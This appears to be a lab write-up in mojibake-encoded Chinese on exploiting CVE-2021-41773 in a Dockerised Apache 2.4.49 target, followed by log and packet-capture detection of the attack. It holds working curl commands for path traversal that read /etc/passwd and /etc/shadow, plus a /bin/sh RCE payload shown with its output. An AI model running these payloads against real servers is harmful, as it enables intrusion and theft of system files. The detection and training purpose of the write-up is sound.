**ç›®å½•å‘ç°åˆ†æ**ï¼š

- **`/cgi-bin/` (403 Forbidden)**: **å…³é”®å‘ç°** - è¿™æ˜¯CVE-2021-41773æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒè·¯å¾„
  - 403çŠ¶æ€è¡¨æ˜ç›®å½•å­˜åœ¨ä½†è®¿é—®è¢«é™åˆ¶
  - CGIç›®å½•çš„å­˜åœ¨ä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†å…¥å£ç‚¹
- **`/index.html` (200 OK)**: æ ‡å‡†é¦–é¡µæ–‡ä»¶ï¼Œå¤§å°10701å­—èŠ‚
- **`/server-status` (403 Forbidden)**: ApacheçŠ¶æ€é¡µé¢ï¼Œè¢«ä¿æŠ¤ä½†å­˜åœ¨

##### 2.6 ä¿¡æ¯æ”¶é›†æ€»ç»“

1. **æ¼æ´ç¡®è®¤**:

   - Apacheç‰ˆæœ¬2.4.49**å®Œå…¨åŒ¹é…CVE-2021-41773çš„å—å½±å“ç‰ˆæœ¬**
   - æœåŠ¡å™¨é…ç½®æ ‡å‡†ï¼Œæœªå‘ç°ç‰¹æ®Šçš„å®‰å…¨åŠ å›º
2. **æ”»å‡»æ¡ä»¶æ»¡è¶³**:

   - **ç‰ˆæœ¬åŒ¹é…**: ç¡®è®¤ä¸ºæ˜“å—æ”»å‡»çš„Apacheç‰ˆæœ¬
   - **æœåŠ¡é…ç½®**: æ ‡å‡†Apacheé…ç½®ï¼Œä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†æ¡ä»¶
3. **å®‰å…¨æ€åŠ¿è¯„ä¼°**:

   - **é«˜é£é™©**: ç‰ˆæœ¬å®Œå…¨åŒ¹é…å·²çŸ¥é«˜å±æ¼æ´
   - **é…ç½®è–„å¼±**: ç¼ºå°‘å¤šä¸ªå®‰å…¨å¤´ï¼Œä¿¡æ¯æ³„éœ²é£é™©
   - **æ”»å‡»é¢**: CGIåŠŸèƒ½å¯ç”¨ï¼Œä¸ºä»£ç æ‰§è¡Œæä¾›äº†å¯èƒ½

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

##### 3.1 CVE-2021-41773 æ¼æ´åŸç†

**æ¼æ´åŸºæœ¬ä¿¡æ¯**:

- **CVEç¼–å·**: CVE-2021-41773
- **CVSSè¯„åˆ†**: 7.5 (é«˜å±)
- **æ¼æ´ç±»å‹**: è·¯å¾„éå† (Path Traversal)
- **å½±å“ç‰ˆæœ¬**: Apache HTTP Server 2.4.49
- **æ¼æ´åŸç†**: Apache 2.4.49ç‰ˆæœ¬åœ¨å¤„ç†URLè·¯å¾„è§„èŒƒåŒ–æ—¶å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„URLç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œè®¿é—®Webæ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶

**æŠ€æœ¯ç»†èŠ‚**:

- **æ ¹æœ¬åŸå› **: Apacheå¯¹URLä¸­çš„è·¯å¾„åˆ†éš”ç¬¦å’Œç‚¹å·åºåˆ—çš„å¤„ç†ä¸å½“
- **ç»•è¿‡æœºåˆ¶**: ä½¿ç”¨URLç¼–ç çš„ç‚¹å·(`%2e`)å¯ä»¥ç»•è¿‡è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥
- **æ”»å‡»è·¯å¾„**: é€šè¿‡Aliasæ˜ å°„çš„ç›®å½•(å¦‚ `/cgi-bin/`, `/icons/`)è¿›è¡Œè·¯å¾„éå†

##### 3.2 è·¯å¾„éå†æ”»å‡»å®è·µ

###### 3.2.1 åŸºç¡€è·¯å¾„éå†æµ‹è¯•

```bash
# å°è¯•é€šè¿‡CGIè·¯å¾„è¯»å– /etc/passwd æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•è¯»å– Apache é…ç½®æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# å°è¯•è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**æ‰§è¡Œç»“æœåˆ†æ**:
æ‰€æœ‰é€šè¿‡ `/cgi-bin/`è·¯å¾„çš„æ”»å‡»å°è¯•éƒ½è¿”å›äº† `500 Internal Server Error`ï¼Œè¿™è¡¨æ˜ï¼š

1. **CGIé…ç½®é—®é¢˜**: CGIæ¨¡å—å¯èƒ½æ²¡æœ‰æ­£ç¡®é…ç½®æˆ–ç¼ºå°‘å¿…è¦çš„CGIè„šæœ¬
2. **è·¯å¾„è§£æé—®é¢˜**: Apacheå¯èƒ½å¯¹CGIè·¯å¾„ä¸‹çš„è·¯å¾„éå†æœ‰ç‰¹æ®Šå¤„ç†
3. **æƒé™é™åˆ¶**: å¯èƒ½å­˜åœ¨é¢å¤–çš„è®¿é—®æ§åˆ¶æœºåˆ¶

###### 3.2.2 éCGIè·¯å¾„çš„ç›´æ¥éå†æ”»å‡»

CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œæˆ‘ä»¬å°è¯•å…¶ä»–æ˜ å°„è·¯å¾„ï¼š

```bash
# å°è¯•é€šè¿‡iconsè·¯å¾„è¿›è¡Œéå†
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•é€šè¿‡manualè·¯å¾„è¿›è¡Œéå†  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ç›´æ¥æ ¹è·¯å¾„å°è¯•
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**æ‰§è¡Œç»“æœ**:

![1748164510299](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164510299.png)

![1748164589138](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164589138.png)

**æ”»å‡»ç»“æœåˆ†æ**:

1. âœ… **`/icons/` è·¯å¾„æ”»å‡»æˆåŠŸ**

   - **çŠ¶æ€**: ğŸ‰ å®Œå…¨æˆåŠŸ - è¯»å–åˆ°å®Œæ•´çš„ `/etc/passwd` æ–‡ä»¶
   - **ç¼–ç æ–¹å¼**: ä»…ä½¿ç”¨åŸºç¡€çš„å•å±‚URLç¼–ç  `%2e%2e`ï¼ˆä¸éœ€è¦åŒé‡ç¼–ç ï¼‰
   - **æŠ€æœ¯æ„ä¹‰**: è¯æ˜CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œè¿˜å½±å“Apacheçš„é™æ€èµ„æºæ˜ å°„
2. ğŸš« **`/manual/` è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: Manualæ–‡æ¡£è·¯å¾„å¯èƒ½æœ‰ç‰¹æ®Šçš„è®¿é—®æ§åˆ¶é…ç½®
   - **å®‰å…¨ç­–ç•¥**: è¡¨æ˜æŸäº›è·¯å¾„æ˜ å°„æœ‰é¢å¤–çš„å®‰å…¨é™åˆ¶
3. ğŸš« **ç›´æ¥æ ¹è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: æ ¹è·¯å¾„çš„è·¯å¾„éå†è¢«Apacheçš„åŸºç¡€å®‰å…¨æœºåˆ¶é˜»æ­¢

##### 3.3 è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

###### 3.3.1 CGIè·¯å¾„çš„RCEæ”»å‡»å°è¯•

```bash
# é€šè¿‡CGIè·¯å¾„æ‰§è¡Œshellå‘½ä»¤
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCEæ”»å‡»ç»“æœ**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
![1748164624555](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164624555.png)
**ğŸ‰ RCEæ”»å‡»æˆåŠŸï¼**

- **æƒé™è·å–**: æˆåŠŸä»¥ `www-data`ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤
- **æ”»å‡»æ–¹å¼**: é€šè¿‡CGIè·¯å¾„ç»“åˆè·¯å¾„éå†ï¼Œç›´æ¥è°ƒç”¨ç³»ç»Ÿshell
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨æ··åˆç¼–ç  `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶

###### 3.3.2 ç³»ç»Ÿä¿¡æ¯æ”¶é›†

```bash
# è·å–ç³»ç»Ÿä¿¡æ¯
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# æŸ¥çœ‹å½“å‰ç›®å½•
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# åˆ—å‡ºæ ¹ç›®å½•å†…å®¹
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```
![1748164663202](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164663202.png)

##### 3.4 Flagæ–‡ä»¶æœç´¢ä¸è·å–

###### 3.4.1 ç³»ç»Ÿæ–‡ä»¶æœç´¢

```bash
# æœç´¢ç³»ç»Ÿä¸­æ‰€æœ‰åŒ…å«flagçš„æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

![1748164677317](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164677317.png)


æ‰¾åˆ°äº†ï¼flagæ–‡ä»¶åœ¨ `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**


#### 4. å¨èƒæ£€æµ‹

##### 4.1 Apache è®¿é—®æ—¥å¿—åˆ†æ

###### 4.1.1 å®šä½å®¹å™¨å’Œæ—¥å¿—è·¯å¾„

```bash
# æŸ¥çœ‹è¿è¡Œä¸­çš„ Apache å®¹å™¨
docker ps | grep apache
```

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~]
â””â”€$ docker ps | grep apache

a2b4c3a1d377   vulfocus/apache-cve_2021_41773:latest      "/entry.sh"              22 minutes ago   Up 20 seconds           0.0.0.0:42286->80/tcp, :::42286->80/tcp                                                flamboyant_maxwell
```

```bash

# è¿›å…¥å®¹å™¨æŸ¥çœ‹æ—¥å¿—
docker exec -it a2b4c3a1d377 /bin/bash

# Apache è®¿é—®æ—¥å¿—é€šå¸¸ä½äºä»¥ä¸‹è·¯å¾„
ls -la /var/log/apache2/
# é‡ç‚¹å…³æ³¨ access.log å’Œ error.log
```

![1748160129290](image/apacheé¶æ ‡/1748160129290.png)

###### 4.1.2 è®¿é—®æ—¥å¿—åˆ†æ

```bash
# æŸ¥çœ‹æœ€è¿‘çš„è®¿é—®æ—¥å¿—
tail -f /var/log/apache2/access.log

# æœç´¢è·¯å¾„éå†æ”»å‡»ç‰¹å¾
grep -i "%2e%2e\|\.\./" /var/log/apache2/access.log

# æœç´¢CGIç›¸å…³çš„å¯ç–‘è¯·æ±‚
grep -i "cgi-bin" /var/log/apache2/access.log

# æœç´¢iconsè·¯å¾„çš„å¼‚å¸¸è®¿é—®
grep -i "icons.*%2e" /var/log/apache2/access.log
```

![1748161429843](image/apacheé¶æ ‡/1748161429843.png)

![1748161438797](image/apacheé¶æ ‡/1748161438797.png)1. è·¯å¾„éå†æ”»å‡»è®°å½•

**é€šè¿‡ `/icons/`è·¯å¾„çš„æ”»å‡»**ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:39:25 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 1126 "-" "curl/8.7.1"
```

* **æ”»å‡»ç‰¹å¾**: ä½¿ç”¨ `%2e%2e`ï¼ˆURLç¼–ç çš„ `..`ï¼‰è¿›è¡Œè·¯å¾„éå†
* **ç›®æ ‡æ–‡ä»¶**: `/etc/passwd`ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
* **çŠ¶æ€ç **: `200` - **æ”»å‡»æˆåŠŸ**ï¼Œè¿”å›äº†1126å­—èŠ‚çš„æ–‡ä»¶å†…å®¹
* **æ”»å‡»å·¥å…·**: `curl/8.7.1`

2. Flagæ–‡ä»¶æœç´¢å°è¯•

æ”»å‡»è€…ç³»ç»Ÿæ€§åœ°æœç´¢flagæ–‡ä»¶çš„å¸¸è§ä½ç½®ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:39:30 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:34 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:39 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:48 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:56 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:00 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag.txt HTTP/1.1" 404 437 "-" "curl/8.7.1"
```

**æ”»å‡»æ¨¡å¼åˆ†æ**ï¼š

- **ç³»ç»Ÿæ€§æœç´¢**: æ”»å‡»è€…æŒ‰é¡ºåºå°è¯•äº†å¤šä¸ªå¯èƒ½çš„flagä½ç½®
- **çŠ¶æ€ç **: å…¨éƒ¨è¿”å› `404 Not Found`ï¼Œè¯´æ˜è¿™äº›ä½ç½®æ²¡æœ‰flagæ–‡ä»¶
- **æ—¶é—´é—´éš”**: æ¯æ¬¡å°è¯•é—´éš”4-8ç§’ï¼Œæ˜¾ç¤ºä¸ºæ‰‹åŠ¨æˆ–è„šæœ¬åŒ–æ”»å‡»

3. è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

**é€šè¿‡CGIè·¯å¾„æ‰§è¡Œå‘½ä»¤**ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:40:16 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 188 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:21 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 887 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:26 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 133 "-" "curl/8.7.1"
```

**RCEæ”»å‡»ç‰¹å¾**ï¼š

- **æ”»å‡»è·¯å¾„**: `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`
- **ç¼–ç æŠ€æœ¯**: æ··åˆä½¿ç”¨ `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶
- **HTTPæ–¹æ³•**: `POST` - ç”¨äºå‘é€å‘½ä»¤æ‰§è¡Œçš„payload
- **çŠ¶æ€ç **: `200` - **RCEæ”»å‡»æˆåŠŸ**
- **å“åº”å¤§å°å˜åŒ–**: ä»133å­—èŠ‚åˆ°887å­—èŠ‚ï¼Œè¯´æ˜æ‰§è¡Œäº†ä¸åŒçš„å‘½ä»¤

4.1.3 é”™è¯¯æ—¥å¿—åˆ†æ

```bash
# æŸ¥çœ‹Apacheé”™è¯¯æ—¥å¿—
tail -f /var/log/apache2/error.log

# æœç´¢ä¸è·¯å¾„éå†ç›¸å…³çš„é”™è¯¯
grep -i "path\|directory\|forbidden" /var/log/apache2/error.log

# æœç´¢CGIæ‰§è¡Œç›¸å…³çš„é”™è¯¯
grep -i "cgi\|script" /var/log/apache2/error.log
```

![1748161515881](image/apacheé¶æ ‡/1748161515881.png)

Apacheé”™è¯¯æ—¥å¿—åˆ†æ:

1. è·¯å¾„éå†æ£€æµ‹ä¸é˜»æ­¢

**æ— æ•ˆURIè·¯å¾„é”™è¯¯**ï¼š

```bash
[Sun May 25 07:39:43.793225 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.html)
[Sun May 25 07:39:43.795361 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.cgi)
[Sun May 25 07:39:43.795451 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.pl)
[Sun May 25 07:39:43.795499 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.php)
[Sun May 25 07:39:43.795517 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.xhtml)
[Sun May 25 07:39:43.795536 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.htm)
```

**å…³é”®å‘ç°**ï¼š

- **é”™è¯¯ä»£ç **: `AH10244` - Apacheæ£€æµ‹åˆ°æ— æ•ˆçš„URIè·¯å¾„
- **æ”»å‡»æ¨¡å¼**: ä½¿ç”¨æœªç¼–ç çš„ `../../../../`è¿›è¡Œè·¯å¾„éå†
- **æ—¶é—´é›†ä¸­**: åœ¨07:39:43çš„å‡ æ¯«ç§’å†…è¿ç»­è§¦å‘6æ¬¡é”™è¯¯
- **ç›®æ ‡æ–‡ä»¶**: æ”»å‡»è€…å°è¯•è®¿é—®å„ç§indexæ–‡ä»¶ï¼ˆ.html, .cgi, .pl, .php, .xhtml, .htmï¼‰
- **é˜²æŠ¤æœºåˆ¶**: Apacheçš„è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥æˆåŠŸé˜»æ­¢äº†è¿™äº›æ”»å‡»

2. CGIæ‰§è¡Œé”™è¯¯åˆ†æ

**CGIæ”»å‡»åˆ†æ**ï¼š

- **é”™è¯¯ç±»å‹**: `cgid:error` - CGIå®ˆæŠ¤è¿›ç¨‹é”™è¯¯
- **æƒé™é—®é¢˜**: ç³»ç»Ÿæ‹’ç»æ‰§è¡Œ `/etc/passwd`æ–‡ä»¶ï¼ˆå› ä¸ºå®ƒä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰
- **æ”»å‡»æ„å›¾**: æ”»å‡»è€…è¯•å›¾é€šè¿‡CGIè·¯å¾„ç›´æ¥æ‰§è¡Œç³»ç»Ÿæ–‡ä»¶
- **é˜²æŠ¤æ•ˆæœ**: æ–‡ä»¶ç³»ç»Ÿæƒé™æˆåŠŸé˜»æ­¢äº†æ¶æ„æ‰§è¡Œ

**Shellæ‰§è¡Œé”™è¯¯**ï¼š

```bash
[Sun May 25 07:41:05.002629 2025] [cgid:error] [pid 20:tid 281472728565312] [client 10.37.133.3:58948] End of script output before headers: sh
```

**é‡è¦å‘ç°**ï¼š

- **æ”»å‡»æºå˜åŒ–**: ä» `10.37.133.2`åˆ‡æ¢åˆ° `10.37.133.3`
- **æ‰§è¡Œç›®æ ‡**: ç›´æ¥è°ƒç”¨ `sh` shell
- **é”™è¯¯æ€§è´¨**: "End of script output before headers" - è¡¨æ˜shellè¢«æ‰§è¡Œä½†æ²¡æœ‰äº§ç”Ÿæœ‰æ•ˆçš„CGIè¾“å‡ºå¤´
- **æ”»å‡»æˆåŠŸ**: å°½ç®¡æœ‰é”™è¯¯ï¼Œä½†è¿™å®é™…ä¸Šè¡¨æ˜RCEæ”»å‡»å¯èƒ½å·²ç»æˆåŠŸ

5. å®‰å…¨é˜²æŠ¤æ•ˆæœè¯„ä¼°

**æˆåŠŸçš„é˜²æŠ¤**ï¼š

- âœ… **è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥**: é˜»æ­¢äº†æœªç¼–ç çš„è·¯å¾„éå†
- âœ… **æ–‡ä»¶æƒé™æ§åˆ¶**: é˜»æ­¢äº†éå¯æ‰§è¡Œæ–‡ä»¶çš„æ‰§è¡Œ
- âœ… **CGIå®‰å…¨æœºåˆ¶**: é™åˆ¶äº†æ¶æ„CGIæ‰§è¡Œ

**é˜²æŠ¤ç»•è¿‡**ï¼š

- âŒ **ç¼–ç ç»•è¿‡**: URLç¼–ç çš„è·¯å¾„éå†æœªè¢«é˜»æ­¢ï¼ˆä»è®¿é—®æ—¥å¿—å¯è§ï¼‰
- âŒ **Shellæ‰§è¡Œ**: æœ€ç»ˆæˆåŠŸæ‰§è¡Œäº†shellå‘½ä»¤

##### 4.2 ç½‘ç»œæµé‡æ•è·ä¸åˆ†æ

###### 4.2.1 ç¡®å®šå®¹å™¨ç½‘ç»œä¿¡æ¯

```bash
# è·å– Apache å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯
docker inspect a2b4c3a1d377 | grep -A 10 -B 5 "IPAddress"
```

![1748160719557](image/apacheé¶æ ‡/1748160719557.png)
æ ¹æ®å®¹å™¨ä¿¡æ¯ï¼Œå†…éƒ¨ IP ä¸º `172.17.0.2`

###### 4.2.2 HTTPæµé‡ç›‘æ§

```bash
# ç›‘å¬ Docker ç½‘æ¡¥ä¸Šçš„ HTTP æµé‡
sudo tcpdump -i docker0 -A -w apache_cve_traffic.pcap 'host 172.17.0.2'
```

åœ¨å¦ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œæ”»å‡»å‘½ä»¤ï¼Œç„¶ååœæ­¢æŠ“åŒ…ï¼š

```bash
# æ‰§è¡Œè·¯å¾„éå†æ”»å‡»
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# æ‰§è¡ŒRCEæ”»å‡»
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

![1748160898808](image/apacheé¶æ ‡/1748160898808.png)

![1748160908687](image/apacheé¶æ ‡/1748160908687.png)

###### 4.2.3 æµé‡åˆ†æè¦ç‚¹

ä½¿ç”¨ Wireshark åˆ†ææ•è·çš„æµé‡ï¼š

1. **è·¯å¾„éå†è¯†åˆ«**: æŸ¥æ‰¾åŒ…å« `%2e%2e`ç¼–ç çš„HTTP GETè¯·æ±‚
2. **RCEæ”»å‡»è¯†åˆ«**: å¯»æ‰¾å‘CGIè·¯å¾„å‘é€POSTæ•°æ®çš„è¯·æ±‚
3. **å“åº”åˆ†æ**: è§‚å¯ŸæœåŠ¡å™¨è¿”å›çš„æ•æ„Ÿæ–‡ä»¶å†…å®¹æˆ–å‘½ä»¤æ‰§è¡Œç»“æœ
4. **å¼‚å¸¸æ¨¡å¼**: è¯†åˆ«çŸ­æ—¶é—´å†…å¤§é‡è·¯å¾„éå†å°è¯•çš„æ¨¡å¼

![1748160976060](image/apacheé¶æ ‡/1748160976060.png)

wiresharkæµé‡åˆ†æ

1. æ”»å‡»æµé‡æ¦‚è§ˆ

**æ•è·çš„æ•°æ®åŒ…æ€»æ•°**: 20ä¸ªæ•°æ®åŒ…
**æ”»å‡»æŒç»­æ—¶é—´**: çº¦4.2ç§’
**æ”»å‡»æº**: `10.37.133.3` (Kaliæ”»å‡»æœº)
**ç›®æ ‡**: `172.17.0.2:80` (Apacheå®¹å™¨)

2. ç¬¬ä¸€æ¬¡æ”»å‡»è¿æ¥åˆ†æ (æ•°æ®åŒ…1-10)

2.1 TCPè¿æ¥å»ºç«‹

```
æ•°æ®åŒ…1-3: TCPä¸‰æ¬¡æ¡æ‰‹
- æ•°æ®åŒ…1 (0.000000s): SYN - æ”»å‡»æœºå‘èµ·è¿æ¥è¯·æ±‚
- æ•°æ®åŒ…2 (0.000030s): SYN+ACK - æœåŠ¡å™¨å“åº”è¿æ¥
- æ•°æ®åŒ…3 (0.000040s): ACK - è¿æ¥å»ºç«‹å®Œæˆ
```

**è¿æ¥ç‰¹å¾**:

- **ç«¯å£æ˜ å°„**: æ”»å‡»æœºç«¯å£40722 â†’ æœåŠ¡å™¨ç«¯å£80
- **å»ºç«‹æ—¶é—´**: ä»…ç”¨æ—¶40å¾®ç§’ï¼Œè¿æ¥å»ºç«‹éå¸¸å¿«é€Ÿ
- **ç½‘ç»œå»¶è¿Ÿ**: æä½å»¶è¿Ÿï¼Œè¯´æ˜æ˜¯æœ¬åœ°Dockerç½‘ç»œ

2.2 RCEæ”»å‡»è½½è·

```
æ•°æ®åŒ…4 (0.000105s): HTTP POSTè¯·æ±‚
- æ–¹æ³•: POST
- è·¯å¾„: /cgi-bin/..%2e/..%2e/..%2e/..%2e/bin/sh
- é•¿åº¦: 290å­—èŠ‚
- åè®®: HTTP
```

**æ”»å‡»ç‰¹å¾åˆ†æ**:

- **æ”»å‡»ç±»å‹**: è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨ `..%2e`æ··åˆç¼–ç ç»•è¿‡è·¯å¾„æ£€æŸ¥
- **ç›®æ ‡è·¯å¾„**: é€šè¿‡CGIè·¯å¾„éå†åˆ° `/bin/sh`
- **HTTPæ–¹æ³•**: POST - ç”¨äºå‘é€å‘½ä»¤æ‰§è¡Œpayload
- **è½½è·å¤§å°**: 290å­—èŠ‚ï¼ŒåŒ…å«å®Œæ•´çš„CGIå‘½ä»¤æ‰§è¡Œæ•°æ®

2.3 æœåŠ¡å™¨å“åº”

```
æ•°æ®åŒ…5 (0.000125s): TCP ACK - æœåŠ¡å™¨ç¡®è®¤æ”¶åˆ°è¯·æ±‚
æ•°æ®åŒ…6 (0.040140s): HTTP 200 OKå“åº”
- çŠ¶æ€ç : 200 OK
- å†…å®¹ç±»å‹: text/plain
- å“åº”é•¿åº¦: 254å­—èŠ‚
- å¤„ç†æ—¶é—´: 40æ¯«ç§’
```

**å“åº”åˆ†æ**:

- **æ”»å‡»æˆåŠŸ**: HTTP 200çŠ¶æ€ç è¡¨æ˜RCEæ”»å‡»æˆåŠŸæ‰§è¡Œ
- **å“åº”å†…å®¹**: text/plainæ ¼å¼ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ
- **å¤„ç†å»¶è¿Ÿ**: 40æ¯«ç§’çš„å¤„ç†æ—¶é—´ï¼Œè¯´æ˜æœåŠ¡å™¨æ‰§è¡Œäº†shellå‘½ä»¤
- **æ•°æ®å¤§å°**: 254å­—èŠ‚å“åº”ï¼Œå¯èƒ½åŒ…å« `id`å‘½ä»¤çš„è¾“å‡ºç»“æœ

2.4 è¿æ¥å…³é—­

```
æ•°æ®åŒ…7-10: TCPè¿æ¥å…³é—­
- æ•°æ®åŒ…8: æ”»å‡»æœºå‘èµ·FIN+ACK
- æ•°æ®åŒ…9: æœåŠ¡å™¨å“åº”FIN+ACK  
- æ•°æ®åŒ…10: æ”»å‡»æœºç¡®è®¤ACK
```

3. ç¬¬äºŒæ¬¡æ”»å‡»è¿æ¥åˆ†æ (æ•°æ®åŒ…11-20)

3.1 æ–°è¿æ¥å»ºç«‹

```
æ•°æ®åŒ…11-13 (4.212s): ç¬¬äºŒæ¬¡TCPä¸‰æ¬¡æ¡æ‰‹
- æ—¶é—´é—´éš”: 4.2ç§’åå‘èµ·æ–°è¿æ¥
- æ–°ç«¯å£: 40254 â†’ 80
- å»ºç«‹æ—¶é—´: 18å¾®ç§’
```

3.2 è·¯å¾„éå†æ”»å‡»

```
æ•°æ®åŒ…14 (4.212111s): HTTP GETè¯·æ±‚
- æ–¹æ³•: GET  
- è·¯å¾„: /icons/..%2e%2e/..%2e%2e/..%2e%2e/..%2e%2e/etc/passwd
- é•¿åº¦: 191å­—èŠ‚
- åè®®: HTTP
```

**æ”»å‡»ç‰¹å¾åˆ†æ**:

- **æ”»å‡»ç±»å‹**: è·¯å¾„éå†æ–‡ä»¶è¯»å–
- **ç›®æ ‡æ–‡ä»¶**: `/etc/passwd`ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
- **æ”»å‡»è·¯å¾„**: é€šè¿‡ `/icons/`è·¯å¾„è¿›è¡Œéå†
- **ç¼–ç æ–¹å¼**: `..%2e%2e`åŒé‡ç¼–ç ç»•è¿‡æ£€æŸ¥
- **HTTPæ–¹æ³•**: GET - ç”¨äºæ–‡ä»¶è¯»å–

3.3 æ–‡ä»¶è¯»å–æˆåŠŸ

```
æ•°æ®åŒ…16 (4.212740s): HTTP 200 OKå“åº”
